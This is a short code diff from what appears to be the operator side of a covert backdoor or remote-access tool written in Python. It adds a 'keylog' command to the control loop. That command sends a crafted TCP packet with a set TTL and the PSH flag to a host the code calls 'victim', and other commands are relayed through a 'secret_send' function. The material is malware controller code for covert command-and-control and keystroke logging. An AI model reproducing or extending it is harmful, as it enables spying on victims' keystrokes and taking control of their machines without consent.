@@ -108,6 +108,9 @@ def server():
         # If the user types "exit". shutdown the program.
         if(command == "exit"):
             sys.exit()
+        elif(command == "keylog"):
+            send(IP(dst=victim[0], ttl=TTL) /
+                           TCP(sport=myip[1], dport=victim[1], flags="P"))
         else:
             secret_send(command)
 
